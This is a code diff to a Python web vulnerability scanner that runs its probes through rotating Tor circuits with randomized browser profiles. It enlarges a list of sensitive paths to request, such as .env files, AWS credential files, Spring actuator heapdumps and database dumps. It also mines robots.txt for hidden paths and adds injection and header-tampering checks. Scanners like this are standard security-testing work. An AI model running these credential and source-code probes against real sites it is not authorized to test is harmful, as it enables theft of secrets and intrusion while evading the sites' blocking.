@@ -83,6 +83,7 @@ import re
 import secrets
 import ssl
 import sys
+import threading
 import time
 from collections import defaultdict
 from datetime import datetime, timezone
@@ -142,6 +143,25 @@ SEV_HIGH = "HIGH"
 SEV_MEDIUM = "MEDIUM"
 SEV_LOW = "LOW"
 SEV_INFO = "INFO"
+
+# ── Content-validator regexes for _check_sensitive_paths ─────────────
+# Module-level so the VulnScanner lambdas can reference them without
+# recompiling on every probe. Each regex is intentionally cheap.
+_re_hex40 = re.compile(r"^[a-f0-9]{40}$", re.I)  # bare SHA-1 (detached HEAD)
+_re_git_log = re.compile(r"^[a-f0-9]{40}\s+[a-f0-9]{40}\s+", re.I | re.M)
+_re_env_line = re.compile(
+    r"^(?:export\s+)?[A-Z][A-Z0-9_]{1,60}\s*=\s*\S", re.M
+)
+_re_htpasswd = re.compile(
+    r"^[\w.-]+:(?:\$apr1\$|\$2[aby]\$|\$1\$|\$5\$|\$6\$|{SHA})", re.M
+)
+_re_requirements = re.compile(
+    r"^(?:[A-Za-z0-9_.-]+)(?:[<>=!]=|~=)?\s*[\d.]*\s*(?:#.*)?$", re.M
+)
+_re_dockerfile = re.compile(
+    r"^\s*(?:FROM|RUN|CMD|EXPOSE|ENV|COPY|ADD|WORKDIR|ENTRYPOINT|ARG)\s+",
+    re.M | re.I,
+)
 
 # ══════════════════════════════════════════════════════════════════════════
 #  Browser Profile Rotation
@@ -391,6 +411,71 @@ class TorSession:
             return self._wayback_fetch(url)
         return None
 
+    def request(self, method: str, url: str,
+                allow_redirects: bool = True,
+                extra_headers: Optional[Dict[str, str]] = None,
+                **kwargs) -> Optional[requests.Response]:
+        """Generic HTTP request that honors block tracking + rotation.
+
+        The scanner used to do `self._session._session.request(...)` in
+        a dozen places to get verbs other than GET/HEAD/POST-form, which
+        bypassed BLOCK_THRESHOLD, the per-domain delay, circuit
+        rotation, and timeout-retry. That meant a 429-ing target could
+        soak up every verb-tampering / host-header probe and never trip
+        the circuit breaker. Now everyone goes through this.
+        """
+        if shutdown_requested():
+            return None
+        domain = urlparse(url).netloc
+        if self.is_domain_blocked(domain):
+            return None
+        self._total_requests += 1
+        kwargs.setdefault("timeout", REQUEST_TIMEOUT)
+        m_up = method.upper()
+
+        for attempt in range(MAX_RETRIES_PER_URL):
+            self._delay_for_domain(domain)
+            self._maybe_rotate_circuit()
+            headers = _pick_profile()
+            if extra_headers:
+                headers.update(extra_headers)
+            try:
+                self._domain_last[domain] = time.time()
+                resp = self._session.request(
+                    m_up, url,
+                    allow_redirects=allow_redirects,
+                    headers=headers,
+                    **kwargs,
+                )
+            except requests.exceptions.Timeout:
+                self._total_timeouts += 1
+                if attempt < MAX_RETRIES_PER_URL - 1:
+                    newnym()
+                    time.sleep(1 + secrets.randbelow(2000) / 1000.0)
+                    continue
+                return None
+            except requests.exceptions.ConnectionError:
+                self._domain_blocks[domain] = self._domain_blocks.get(domain, 0) + 1
+                if attempt < MAX_RETRIES_PER_URL - 1:
+                    newnym()
+                    time.sleep(1 + secrets.randbelow(2000) / 1000.0)
+                    continue
+                return None
+            except Exception:
+                return None
+
+            if resp.status_code in (403, 429, 503):
+                self._domain_blocks[domain] = self._domain_blocks.get(domain, 0) + 1
+                self._total_blocks += 1
+                if self.is_domain_blocked(domain):
+                    integrity_log("intel", f"domain_circuit_breaker:{domain}")
+                    return resp  # still return so caller can inspect
+                # Don't retry every verb — checks like verb tampering
+                # expect 4xx; only rotate circuit + return.
+                return resp
+            return resp
+        return None
+
     def get_stats(self) -> dict:
         """Return session statistics for reporting."""
         return {
@@ -635,8 +720,13 @@ class TechFingerprinter:
         tech = {"server": None, "cms": [], "frameworks": [], "powered_by": None,
                 "language": None, "cdn": None}
 
+        # Build a lower-keyed snapshot once — dict(resp.headers) can
+        # preserve whatever casing the server sent, so relying on
+        # 'Server' OR 'server' still misses 'SERVER' / 'serveR'.
+        h_lower = {k.lower(): v for k, v in headers.items()}
+
         # Server header
-        server = headers.get("Server", headers.get("server", ""))
+        server = h_lower.get("server", "")
         if server:
             tech["server"] = server
             for name, pat in cls.SERVER_PATTERNS.items():
@@ -646,7 +736,7 @@ class TechFingerprinter:
                     break
 
         # X-Powered-By
-        powered = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
+        powered = h_lower.get("x-powered-by", "")
         if powered:
             tech["powered_by"] = powered
             if "PHP" in powered.upper():
@@ -656,16 +746,16 @@ class TechFingerprinter:
             elif "Express" in powered:
                 tech["language"] = "Node.js (Express)"
 
-        # CDN detection
-        for cdn_header in ["cf-ray", "x-cache", "x-cdn", "x-amz-cf-id"]:
-            if cdn_header in {k.lower() for k in headers}:
-                if "cf-ray" in {k.lower() for k in headers}:
-                    tech["cdn"] = "Cloudflare"
-                elif "x-amz-cf-id" in {k.lower() for k in headers}:
-                    tech["cdn"] = "AWS CloudFront"
-                else:
-                    tech["cdn"] = "CDN detected"
-                break
+        # CDN detection — check the lower-keyed snapshot directly
+        # (was rebuilding {k.lower() for k in headers} inside the loop
+        # on every iteration + twice per match, which is wasteful and
+        # loses the values anyway).
+        if "cf-ray" in h_lower:
+            tech["cdn"] = "Cloudflare"
+        elif "x-amz-cf-id" in h_lower:
+            tech["cdn"] = "AWS CloudFront"
+        elif any(h in h_lower for h in ("x-cache", "x-cdn")):
+            tech["cdn"] = "CDN detected"
 
         # CMS detection from HTML
         for cms_name, patterns in cls.CMS_PATTERNS.items():
@@ -705,60 +795,278 @@ class VulnScanner:
     {severity, title, detail, evidence} dicts.
     """
 
-    # Sensitive paths to probe — common misconfigs that expose data
+    # Sensitive paths to probe — common misconfigs that expose data.
+    # Ordered by severity so the circuit-breaker bails out AFTER the
+    # highest-value paths have been tested.
     SENSITIVE_PATHS = [
+        # ── VCS exposure (full source code) ──────────────────────────
         ("/.git/HEAD", "Git repository exposed", SEV_CRITICAL,
          "Full source code + commit history downloadable"),
-        ("/.env", "Environment file exposed", SEV_CRITICAL,
-         "Database credentials, API keys, secrets in plaintext"),
         ("/.git/config", "Git config exposed", SEV_HIGH,
          "Remote repository URLs, author info revealed"),
+        ("/.git/logs/HEAD", "Git log exposed", SEV_HIGH,
+         "Commit history + author emails reveal dev workflow"),
+        ("/.svn/entries", "SVN metadata exposed", SEV_HIGH,
+         "Subversion repository structure and file listing"),
+        ("/.svn/wc.db", "SVN database exposed", SEV_CRITICAL,
+         "Full SVN working-copy database — file contents recoverable"),
+        ("/.hg/store/00manifest.i", "Mercurial repo exposed", SEV_HIGH,
+         "Mercurial repository metadata — source recoverable"),
+        ("/.bzr/branch/branch.conf", "Bazaar repo exposed", SEV_HIGH,
+         "Bazaar branch config exposed"),
+        ("/CVS/Root", "CVS metadata exposed", SEV_HIGH,
+         "CVS repository location leaked"),
+        # ── Env / config files ──────────────────────────────────────
+        ("/.env", "Environment file exposed", SEV_CRITICAL,
+         "Database credentials, API keys, secrets in plaintext"),
+        ("/.env.local", ".env.local exposed", SEV_CRITICAL,
+         "Local dev secrets (often stronger than prod)"),
+        ("/.env.production", ".env.production exposed", SEV_CRITICAL,
+         "Production secrets in plaintext"),
+        ("/.env.development", ".env.development exposed", SEV_HIGH,
+         "Development secrets — often reuse prod passwords"),
+        ("/.env.backup", ".env backup exposed", SEV_CRITICAL,
+         "Backup of production env file"),
+        ("/.env.bak", ".env.bak exposed", SEV_CRITICAL,
+         "Backup of production env file"),
         ("/wp-config.php.bak", "WordPress config backup", SEV_CRITICAL,
          "Database credentials in plaintext backup file"),
         ("/wp-config.php~", "WordPress config editor backup", SEV_CRITICAL,
          "Database credentials in editor temp file"),
+        ("/wp-config.php.save", "WordPress config .save", SEV_CRITICAL,
+         "nano/emacs WordPress config backup"),
+        ("/config.php.bak", "PHP config backup", SEV_HIGH,
+         "Application configuration backup"),
+        ("/web.config.bak", ".NET web.config backup", SEV_HIGH,
+         "IIS / ASP.NET config backup"),
+        ("/.htaccess", "Apache config exposed", SEV_MEDIUM,
+         "Rewrite rules, auth config, internal paths"),
+        ("/.htpasswd", "Apache password file exposed", SEV_CRITICAL,
+         "Basic-auth password hashes"),
+        ("/WEB-INF/web.xml", "Java config exposed", SEV_CRITICAL,
+         "Servlet mappings, security constraints, database config"),
+        ("/WEB-INF/classes/application.properties",
+         "Spring application.properties exposed", SEV_CRITICAL,
+         "Spring Boot config with DB URLs + credentials"),
+        ("/WEB-INF/classes/application.yml",
+         "Spring application.yml exposed", SEV_CRITICAL,
+         "Spring Boot YAML config"),
+        ("/crossdomain.xml", "Flash crossdomain policy", SEV_LOW,
+         "Overly permissive Flash cross-origin policy"),
+        ("/clientaccesspolicy.xml", "Silverlight policy", SEV_LOW,
+         "Silverlight client access policy exposed"),
+        # ── Discovery / metadata ────────────────────────────────────
         ("/.DS_Store", "macOS directory metadata", SEV_LOW,
          "File listing of directory contents leaked"),
         ("/robots.txt", "Robots.txt", SEV_INFO,
          "May reveal hidden directories and admin paths"),
         ("/sitemap.xml", "Sitemap", SEV_INFO,
          "Full site structure enumeration"),
+        ("/sitemap_index.xml", "Sitemap index", SEV_INFO,
+         "Sitemap index — enumerates all sitemaps"),
+        ("/humans.txt", "humans.txt", SEV_INFO,
+         "Developer credits — OSINT for social engineering"),
         ("/.well-known/security.txt", "Security.txt", SEV_INFO,
          "Security contact and disclosure policy"),
+        ("/security.txt", "security.txt (non-standard)", SEV_INFO,
+         "Security contact — non-.well-known location"),
+        ("/.well-known/openid-configuration",
+         "OpenID discovery", SEV_INFO,
+         "OIDC endpoints, supported scopes, issuer"),
+        ("/.well-known/oauth-authorization-server",
+         "OAuth discovery", SEV_INFO,
+         "OAuth2 server metadata"),
+        ("/.well-known/assetlinks.json",
+         "Android Asset Links", SEV_INFO,
+         "Digital asset links for Android app bindings"),
+        ("/.well-known/apple-app-site-association",
+         "iOS universal-links manifest", SEV_INFO,
+         "iOS universal-links — app bundle IDs + path mappings"),
+        # ── Server-status / info ────────────────────────────────────
         ("/server-status", "Apache server-status", SEV_HIGH,
          "Live request info, client IPs, internal paths"),
         ("/server-info", "Apache server-info", SEV_HIGH,
          "Full server configuration exposed"),
+        ("/nginx_status", "nginx stub_status", SEV_MEDIUM,
+         "Active connections and request counts"),
+        ("/stub_status", "nginx stub_status (alt)", SEV_MEDIUM,
+         "Active connections and request counts"),
+        ("/status", "Generic /status endpoint", SEV_INFO,
+         "Health/status endpoint — may expose build info"),
+        ("/.well-known/status", ".well-known/status", SEV_INFO,
+         "Status info at well-known location"),
         ("/phpinfo.php", "PHP info page", SEV_HIGH,
          "Server config, paths, loaded modules, environment"),
         ("/info.php", "PHP info page (alt)", SEV_HIGH,
          "Server config, paths, loaded modules, environment"),
-        ("/wp-json/wp/v2/users", "WordPress user enumeration", SEV_MEDIUM,
-         "Usernames and user IDs publicly accessible"),
-        ("/api/", "API root endpoint", SEV_INFO,
-         "API endpoint may expose documentation or data"),
-        ("/graphql", "GraphQL endpoint", SEV_MEDIUM,
-         "GraphQL introspection may expose full schema"),
-        ("/debug", "Debug endpoint", SEV_HIGH,
-         "Debug information and internal state exposed"),
-        ("/.htaccess", "Apache config exposed", SEV_MEDIUM,
-         "Rewrite rules, auth config, internal paths"),
-        ("/crossdomain.xml", "Flash crossdomain policy", SEV_LOW,
-         "Overly permissive Flash cross-origin policy"),
-        ("/backup/", "Backup directory", SEV_HIGH,
-         "Database dumps, source code backups"),
-        ("/admin/", "Admin panel", SEV_INFO,
-         "Administrative interface accessible"),
+        ("/test.php", "test.php file", SEV_MEDIUM,
+         "Developer test script — often phpinfo() or raw eval"),
+        # ── Debug / admin consoles ──────────────────────────────────
         ("/console", "Debug console", SEV_CRITICAL,
          "Interactive debug console (e.g., Werkzeug, Rails)"),
+        ("/__debug__/", "Debug console", SEV_CRITICAL,
+         "Django/debug_toolbar console"),
+        ("/debug", "Debug endpoint", SEV_HIGH,
+         "Debug information and internal state exposed"),
+        ("/_debugbar/", "Debugbar panel", SEV_HIGH,
+         "Laravel/Symfony debug bar exposed"),
         ("/elmah.axd", "ELMAH error log (.NET)", SEV_HIGH,
          "Full error logs with stack traces and request data"),
         ("/trace.axd", ".NET trace", SEV_HIGH,
          "Request tracing with headers, cookies, session data"),
-        ("/.svn/entries", "SVN metadata exposed", SEV_HIGH,
-         "Subversion repository structure and file listing"),
-        ("/WEB-INF/web.xml", "Java config exposed", SEV_CRITICAL,
-         "Servlet mappings, security constraints, database config"),
+        # ── Spring / Java actuators ─────────────────────────────────
+        ("/actuator", "Spring actuator root", SEV_HIGH,
+         "Spring Boot Actuator — lists all management endpoints"),
+        ("/actuator/env", "Spring actuator env", SEV_CRITICAL,
+         "Full environment incl. DB passwords and API keys"),
+        ("/actuator/heapdump", "Spring actuator heapdump", SEV_CRITICAL,
+         "Full JVM heap — secrets, sessions, DB conns in memory"),
+        ("/actuator/mappings", "Spring actuator mappings", SEV_MEDIUM,
+         "Complete list of URL → handler mappings"),
+        ("/actuator/trace", "Spring actuator trace", SEV_HIGH,
+         "Last 100 HTTP requests including auth headers"),
+        ("/actuator/httptrace", "Spring actuator httptrace", SEV_HIGH,
+         "Last HTTP traces — request / response bodies"),
+        ("/actuator/loggers", "Spring actuator loggers", SEV_MEDIUM,
+         "Logger configuration — modifiable via POST"),
+        ("/actuator/beans", "Spring actuator beans", SEV_MEDIUM,
+         "Enumerates every Spring bean — attack surface map"),
+        ("/actuator/configprops", "Spring actuator configprops",
+         SEV_HIGH, "Config properties with credentials redacted (or not)"),
+        ("/actuator/threaddump", "Spring actuator threaddump",
+         SEV_MEDIUM, "Full thread dump incl. stack traces"),
+        ("/actuator/info", "Spring actuator info", SEV_INFO,
+         "Build and git-commit info"),
+        ("/manage", "Spring legacy /manage", SEV_HIGH,
+         "Pre-Actuator management endpoint — same surface"),
+        ("/jolokia/", "Jolokia JMX HTTP bridge", SEV_CRITICAL,
+         "JMX over HTTP — pre-auth RCE on misconfig"),
+        # ── API / docs ──────────────────────────────────────────────
+        ("/api/", "API root endpoint", SEV_INFO,
+         "API endpoint may expose documentation or data"),
+        ("/api/v1/", "API v1 root", SEV_INFO,
+         "Versioned API root"),
+        ("/api/v2/", "API v2 root", SEV_INFO,
+         "Versioned API root"),
+        ("/swagger-ui.html", "Swagger UI", SEV_MEDIUM,
+         "API documentation UI — full endpoint catalog"),
+        ("/swagger-ui/", "Swagger UI (dir)", SEV_MEDIUM,
+         "API documentation UI — full endpoint catalog"),
+        ("/swagger/", "Swagger (dir)", SEV_MEDIUM,
+         "API documentation UI"),
+        ("/swagger.json", "Swagger/OpenAPI 2 spec", SEV_MEDIUM,
+         "Machine-readable API schema — full attack surface"),
+        ("/openapi.json", "OpenAPI 3 spec", SEV_MEDIUM,
+         "Machine-readable API schema"),
+        ("/v2/api-docs", "Springfox API docs", SEV_MEDIUM,
+         "Spring/Springfox auto-generated API spec"),
+        ("/v3/api-docs", "Springdoc API docs", SEV_MEDIUM,
+         "Springdoc auto-generated OpenAPI 3 spec"),
+        ("/api-docs", "Generic API docs", SEV_MEDIUM,
+         "Machine-readable API schema"),
+        # ── GraphQL ─────────────────────────────────────────────────
+        ("/graphql", "GraphQL endpoint", SEV_MEDIUM,
+         "GraphQL introspection may expose full schema"),
+        ("/graphiql", "GraphiQL IDE exposed", SEV_MEDIUM,
+         "Interactive GraphQL IDE — schema + query interface"),
+        ("/graphql-playground", "GraphQL Playground exposed",
+         SEV_MEDIUM, "Interactive GraphQL playground"),
+        ("/v1/graphql", "GraphQL v1", SEV_MEDIUM,
+         "Versioned GraphQL endpoint"),
+        # ── WordPress ───────────────────────────────────────────────
+        ("/wp-json/wp/v2/users", "WordPress user enumeration",
+         SEV_MEDIUM, "Usernames and user IDs publicly accessible"),
+        ("/wp-login.php", "WordPress login", SEV_INFO,
+         "Login endpoint — enables brute-force"),
+        ("/xmlrpc.php", "WordPress XML-RPC", SEV_MEDIUM,
+         "Brute-force amplification, pingback SSRF"),
+        ("/wp-content/debug.log", "WordPress debug log",
+         SEV_HIGH, "Debug output — paths, queries, errors"),
+        ("/readme.html", "WordPress readme", SEV_LOW,
+         "Exact WordPress version disclosure"),
+        # ── Admin panels ────────────────────────────────────────────
+        ("/admin/", "Admin panel", SEV_INFO,
+         "Administrative interface accessible"),
+        ("/administrator/", "Joomla admin", SEV_INFO,
+         "Joomla admin panel"),
+        ("/admin.php", "Generic admin.php", SEV_INFO,
+         "PHP-based admin panel"),
+        ("/login", "Generic /login", SEV_INFO,
+         "Login page exists at standard path"),
+        ("/user/login", "Drupal-style login", SEV_INFO,
+         "Drupal login page"),
+        # ── Backup archives ─────────────────────────────────────────
+        ("/backup/", "Backup directory", SEV_HIGH,
+         "Database dumps, source code backups"),
+        ("/backup.sql", "DB dump in document root",
+         SEV_CRITICAL, "Full DB dump downloadable"),
+        ("/backup.tar.gz", "tarball in document root",
+         SEV_CRITICAL, "Site/source backup"),
+        ("/backup.zip", "zip in document root",
+         SEV_CRITICAL, "Site/source backup"),
+        ("/db.sql", "Raw DB dump", SEV_CRITICAL,
+         "Full database SQL dump"),
+        ("/dump.sql", "Raw DB dump (alt)", SEV_CRITICAL,
+         "Full database SQL dump"),
+        # ── Cloud / runtime leaks ───────────────────────────────────
+        ("/.aws/credentials", "AWS credentials file", SEV_CRITICAL,
+         "AWS access key / secret exposed"),
+        ("/.aws/config", "AWS config file", SEV_HIGH,
+         "AWS region / profile leaked"),
+        ("/docker-compose.yml", "docker-compose.yml", SEV_HIGH,
+         "Container composition incl. secret env vars"),
+        ("/docker-compose.yaml", "docker-compose.yaml", SEV_HIGH,
+         "Container composition incl. secret env vars"),
+        ("/Dockerfile", "Dockerfile exposed", SEV_MEDIUM,
+         "Build instructions — reveals base image, cmd, env"),
+        ("/.dockerignore", ".dockerignore exposed", SEV_INFO,
+         "Build exclusion list"),
+        ("/kubernetes.yaml", "K8s manifest exposed", SEV_MEDIUM,
+         "Workload spec incl. secrets mount mapping"),
+        # ── IDE / editor artefacts ──────────────────────────────────
+        ("/.idea/workspace.xml", "IntelliJ workspace", SEV_MEDIUM,
+         "IDE workspace — paths, remote URLs, VCS config"),
+        ("/.vscode/settings.json", "VS Code settings",
+         SEV_LOW, "Editor settings — may contain secrets"),
+        ("/.vscode/sftp.json", "VS Code SFTP config", SEV_HIGH,
+         "SFTP deploy credentials"),
+        # ── Node / JS ecosystem ─────────────────────────────────────
+        ("/package.json", "package.json exposed", SEV_LOW,
+         "Node dependencies — attack-surface mapping"),
+        ("/package-lock.json", "package-lock.json", SEV_LOW,
+         "Full dependency tree incl. transitives"),
+        ("/yarn.lock", "yarn.lock exposed", SEV_LOW,
+         "Full dependency tree incl. transitives"),
+        # ── Python ecosystem ────────────────────────────────────────
+        ("/requirements.txt", "requirements.txt exposed",
+         SEV_LOW, "Python dependencies — attack-surface mapping"),
+        ("/Pipfile", "Pipfile exposed", SEV_LOW,
+         "Pipenv dependencies"),
+        ("/Pipfile.lock", "Pipfile.lock exposed", SEV_LOW,
+         "Pipenv full dependency tree"),
+        # ── PHP misc ────────────────────────────────────────────────
+        ("/composer.json", "composer.json exposed", SEV_LOW,
+         "PHP composer dependencies"),
+        ("/composer.lock", "composer.lock exposed", SEV_LOW,
+         "PHP composer full dependency tree"),
+        # ── Log files ───────────────────────────────────────────────
+        ("/access.log", "Access log exposed", SEV_HIGH,
+         "HTTP access log — client IPs, request patterns"),
+        ("/error.log", "Error log exposed", SEV_HIGH,
+         "Application error log with stack traces"),
+        ("/laravel.log", "Laravel log exposed", SEV_HIGH,
+         "Laravel error log — paths, queries, traces"),
+        ("/storage/logs/laravel.log", "Laravel log (in-app)",
+         SEV_HIGH, "Laravel error log"),
+        # ── CI / metadata leaks ─────────────────────────────────────
+        ("/.gitlab-ci.yml", ".gitlab-ci.yml exposed", SEV_MEDIUM,
+         "GitLab CI pipeline — deploy keys, stages"),
+        ("/.github/workflows/", "GitHub workflows exposed",
+         SEV_MEDIUM, "CI workflow files"),
+        ("/.travis.yml", ".travis.yml exposed", SEV_LOW,
+         "Travis CI config"),
+        ("/.circleci/config.yml", "CircleCI config exposed",
+         SEV_MEDIUM, "CircleCI pipeline config"),
     ]
 
     # Open redirect parameters to test
@@ -1037,7 +1345,15 @@ class VulnScanner:
         for pat in patterns:
             for match in pat.findall(html[:200000]):
                 if match.startswith("http"):
-                    if domain in match:
+                    # Match against the parsed netloc so
+                    # example.com.evil.com / *evil-example.com don't
+                    # count as same-origin just because they contain
+                    # our domain as a substring.
+                    try:
+                        m_netloc = urlparse(match).netloc.lower()
+                    except Exception:
+                        continue
+                    if m_netloc == domain or m_netloc.endswith("." + domain):
                         endpoints.add(match)
                 elif match.startswith("/"):
                     endpoints.add(urljoin(base_url, match))
@@ -1125,31 +1441,6 @@ class VulnScanner:
                     profile["error_sensitive"] = True
 
         return profile
-
-    def _classify_response(self, resp: Optional[requests.Response],
-                           baseline_len: int = 0) -> str:
-        """Classify a response as normal, error, blocked, or redirect."""
-        if resp is None:
-            return "failed"
-        if resp.status_code in (403, 429, 503):
-            text_lower = resp.text[:1000].lower() if resp.text else ""
-            if any(kw in text_lower for kw in ("captcha", "challenge", "cloudflare",
-                                                "ddos", "rate limit", "blocked")):
-                return "waf"
-            return "blocked"
-        if resp.status_code in (301, 302, 303, 307, 308):
-            return "redirect"
-        if resp.status_code >= 500:
-            return "error"
-        if resp.status_code == 404:
-            return "not_found"
-        if resp.status_code == 200:
-            if baseline_len > 0 and resp.text:
-                ratio = len(resp.text) / max(baseline_len, 1)
-                if ratio < 0.3:
-                    return "truncated"
-            return "normal"
-        return "other"
 
     def crawl_for_endpoints(self, base_url: str, html: str, depth: int = 1) -> List[dict]:
         """Crawl the site to discover testable endpoints (URLs with params + forms).
@@ -1267,8 +1558,119 @@ class VulnScanner:
         # Phase 1: extract from the initial page HTML
         _extract_from_html(base_url, html)
 
-        # Phase 2: crawl discovered pages (1 level deep, max 15 pages)
-        max_crawl = 15
+        # Phase 1b: seed pages_to_crawl with robots.txt disallow entries
+        # and sitemap.xml URLs. These are the two most effective crawl
+        # extensions — operators who hide admin paths in robots.txt give
+        # away exactly the paths an attacker wants.
+        #
+        # Both caps are intentional: a big e-commerce sitemap easily
+        # contains 10 000+ product pages. We only want to probe a
+        # structural sample, not enumerate the whole catalog.
+        _MAX_ROBOTS_SEEDS = 30
+        _MAX_SITEMAP_SEEDS = 20
+        _MAX_SITEMAP_INDICES = 3  # sitemap indexes can point at dozens of sub-sitemaps
+        sitemaps_queued: Set[str] = set()
+
+        def _ingest_sitemap(sitemap_url: str, budget: int) -> int:
+            """Fetch a sitemap and enqueue up to `budget` <loc> URLs.
+
+            Returns the number of URLs added to pages_to_crawl.
+            If the sitemap is actually a <sitemapindex>, queue up to
+            _MAX_SITEMAP_INDICES sub-sitemaps for later processing
+            (without recursing — we do BFS by returning and letting
+            the outer loop keep budget-limited).
+            """
+            if budget <= 0 or sitemap_url in sitemaps_queued:
+                return 0
+            sitemaps_queued.add(sitemap_url)
+            try:
+                resp = self._session.get(sitemap_url, allow_wayback=False)
+            except Exception:
+                return 0
+            if not resp or resp.status_code != 200 or not resp.text:
+                return 0
+            body = resp.text[:500000]
+            added = 0
+            # Sitemap-of-sitemaps: queue the inner sitemaps (bounded).
+            if "<sitemapindex" in body[:2000].lower():
+                idx_urls = re.findall(
+                    r"<loc>\s*(https?://[^<\s]+)\s*</loc>", body, re.I,
+                )[:_MAX_SITEMAP_INDICES]
+                # Filter to same-origin
+                for sub in idx_urls:
+                    if urlparse(sub).netloc == domain:
+                        inner = _ingest_sitemap(sub, budget - added)
+                        added += inner
+                        if added >= budget:
+                            break
+                return added
+            # Regular sitemap
+            for m in re.findall(
+                r"<loc>\s*(https?://[^<\s]+)\s*</loc>", body, re.I,
+            ):
+                if added >= budget:
+                    break
+                if urlparse(m).netloc != domain:
+                    continue
+                if m in seen_urls:
+                    continue
+                seen_urls.add(m)
+                pages_to_crawl.append(m)
+                added += 1
+            return added
+
+        try:
+            rob_url = urljoin(base_url, "/robots.txt")
+            rob_resp = self._session.get(rob_url, allow_wayback=False)
+            if rob_resp and rob_resp.status_code == 200 and rob_resp.text:
+                seeds_from_robots = 0
+                for line in rob_resp.text[:30000].splitlines():
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    lline = line.lower()
+                    # Both Disallow and Allow leak structure — crawl either.
+                    matched_directive = False
+                    for directive in ("disallow:", "allow:"):
+                        if lline.startswith(directive):
+                            matched_directive = True
+                            if seeds_from_robots >= _MAX_ROBOTS_SEEDS:
+                                break
+                            val = line[len(directive):].strip()
+                            if val and val != "/" and " " not in val:
+                                # Skip wildcard-only disallows; they
+                                # leak nothing structural.
+                                if val.strip("*/").strip():
+                                    full = urljoin(
+                                        base_url,
+                                        val.split("?")[0].split("#")[0],
+                                    )
+                                    p = urlparse(full)
+                                    if (p.netloc == domain and
+                                            full not in seen_urls):
+                                        seen_urls.add(full)
+                                        pages_to_crawl.append(full)
+                                        seeds_from_robots += 1
+                            break
+                    if matched_directive:
+                        continue
+                    if lline.startswith("sitemap:"):
+                        sm = line[len("sitemap:"):].strip()
+                        if sm:
+                            _ingest_sitemap(sm, _MAX_SITEMAP_SEEDS)
+        except Exception as _rex:
+            integrity_log("intel", f"robots_crawl_error:{type(_rex).__name__}")
+
+        # Phase 1c: also try /sitemap.xml directly even if robots didn't
+        # advertise it.
+        try:
+            sm_url = urljoin(base_url, "/sitemap.xml")
+            _ingest_sitemap(sm_url, _MAX_SITEMAP_SEEDS)
+        except Exception as _sex:
+            integrity_log("intel", f"sitemap_crawl_error:{type(_sex).__name__}")
+
+        # Phase 2: crawl discovered pages (1 level deep, max 25 pages)
+        max_crawl = 25
         crawled = 0
         while pages_to_crawl and crawled < max_crawl:
             if shutdown_requested():
@@ -1412,7 +1814,13 @@ class VulnScanner:
 
         if live["method"] == "GET":
             qs = urlencode(data)
-            return self._session.get(f"{live['url']}?{qs}", allow_wayback=False)
+            # Endpoints from crawl_for_endpoints strip the query string,
+            # but a 'fallback' endpoint can still carry base_url with a
+            # pre-existing query. Use '&' to merge instead of '?' so we
+            # don't produce 'foo.com/?a=1?b=2' which the server will
+            # reject.
+            sep = "&" if ("?" in live["url"]) else "?"
+            return self._session.get(f"{live['url']}{sep}{qs}", allow_wayback=False)
         else:
             resp = self._session.post_form(live["url"], data)
             # Follow redirect to see the actual result page
@@ -2015,14 +2423,10 @@ class VulnScanner:
 
                 if endpoint["method"] == "GET":
                     test_url = f"{url}?{pname}={payload}"
-                    try:
-                        self._session._delay_for_domain(domain)
-                        resp = self._session._session.get(
-                            test_url, timeout=REQUEST_TIMEOUT,
-                            proxies=self._session._proxy, headers=_pick_profile(),
-                            allow_redirects=False
-                        )
-                    except Exception:
+                    resp = self._session.request(
+                        "GET", test_url, allow_redirects=False,
+                    )
+                    if resp is None:
                         continue
                 else:
                     resp = self._send_test(endpoint, pname, payload)
@@ -2129,7 +2533,8 @@ class VulnScanner:
             integrity_log("intel", f"check_error:{name}:{type(e).__name__}")
 
     def scan_full(self, base_url: str, html: str = "", headers: dict = None,
-                  depth: str = "full") -> List[dict]:
+                  depth: str = "full",
+                  raw_set_cookies: Optional[List[str]] = None) -> List[dict]:
         """Run all applicable vulnerability checks with progress display.
 
         Each check runs independently — one failure doesn't block others.
@@ -2146,9 +2551,12 @@ class VulnScanner:
                 print(f"      found {len(self._page_params)} testable parameters")
 
         # Header checks (instant, no network)
+        self._run_check("WAF/CDN fingerprint", self._check_waf_fingerprint,
+                        (base_url, html, headers), 0.95, findings)
         self._run_check("security headers", self._check_security_headers,
                         (headers,), 0.95, findings)
-        self._run_check("cookies", self._check_cookies, (headers,), 0.9, findings)
+        self._run_check("cookies", self._check_cookies,
+                        (headers, raw_set_cookies), 0.9, findings)
         self._run_check("CORS", self._check_cors, (base_url, headers), 0.85, findings)
         self._run_check("info disclosure", self._check_info_disclosure,
                         (headers, html), 0.8, findings)
@@ -2166,11 +2574,25 @@ class VulnScanner:
                             (html,), 0.8, findings)
             self._run_check("IDOR indicators", self._check_idor,
                             (base_url, html), 0.7, findings)
+            self._run_check("Host-header injection",
+                            self._check_host_header_injection,
+                            (base_url,), 0.8, findings)
+            self._run_check("HTTP verb tampering",
+                            self._check_http_verb_tampering,
+                            (base_url,), 0.8, findings)
+            self._run_check("login forms + rate limit",
+                            self._check_login_forms,
+                            (base_url, html), 0.85, findings)
 
             if depth == "full":
                 self._run_check("SQL injection (quick)", self._check_sqli_indicators,
                                 (base_url,), 0.85, findings)
+                self._run_check("SQL injection in headers", self._check_sqli_headers,
+                                (base_url,), 0.7, findings)
                 self._run_check("XSS reflection (quick)", self._check_xss_reflection,
+                                (base_url,), 0.85, findings)
+                self._run_check("NoSQL injection (quick)",
+                                self._check_nosql_injection,
                                 (base_url,), 0.85, findings)
 
         if depth == "deep":
@@ -2181,6 +2603,9 @@ class VulnScanner:
                             (base_url,), 0.95, findings)
             self._run_check("directory traversal", self._check_directory_traversal,
                             (base_url,), 0.95, findings)
+            self._run_check("NoSQL injection (deep)",
+                            self._check_nosql_injection,
+                            (base_url,), 0.9, findings)
 
             # Crawl to discover real endpoints with parameters
             if html:
@@ -2264,36 +2689,24 @@ class VulnScanner:
                                     _href = _a.get("href", "")
                                     if _href and not _href.startswith(("#", "javascript:", "mailto:")):
                                         _full = urljoin(ep["url"], _href)
-                                        if domain in urlparse(_full).netloc:
+                                        _f_netloc = urlparse(_full).netloc.lower()
+                                        if _f_netloc == domain or _f_netloc.endswith("." + domain):
                                             revisit_from_injection.add(_full)
                             except Exception:
                                 pass
                     except Exception:
                         pass
 
-                # SSTI markers
-                ssti_a, ssti_b = secrets.randbelow(90)+10, secrets.randbelow(90)+10
-                ssti_expected = str(ssti_a * ssti_b)
